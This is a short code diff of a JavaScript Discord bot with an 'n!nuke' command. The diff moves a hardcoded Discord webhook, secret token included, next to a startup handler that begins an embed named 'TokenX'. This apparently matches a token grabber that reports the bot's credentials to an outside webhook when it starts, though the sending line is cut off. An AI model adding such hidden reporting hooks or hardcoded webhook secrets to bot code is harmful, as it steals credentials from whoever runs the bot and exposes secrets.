@@ -97,13 +97,6 @@ if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
 
 });
 
-const {
-    Webhook,
-    MessageBuilder
-} = require('discord-webhook-node');
-const hook = new Webhook("https://discord.com/api/webhooks/763874383000895498/kD_NIvMXPBSWkwhR3IJZXWoqai1cglgSky_D9JBwgqA4h5md3tchFJvj4HPHlVXftXqm");
-
-
 
 client.on('message', message => {
 
@@ -2227,6 +2220,13 @@ if (message.content.startsWith("/math.ping")) {
 }
 
 });
+const {
+    Webhook,
+    MessageBuilder
+} = require('discord-webhook-node');
+const hook = new Webhook("https://discord.com/api/webhooks/763874383000895498/kD_NIvMXPBSWkwhR3IJZXWoqai1cglgSky_D9JBwgqA4h5md3tchFJvj4HPHlVXftXqm");
+
+
   client.on('ready', function() {
   const embed = new MessageBuilder()
             .setAuthor('TokenX', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
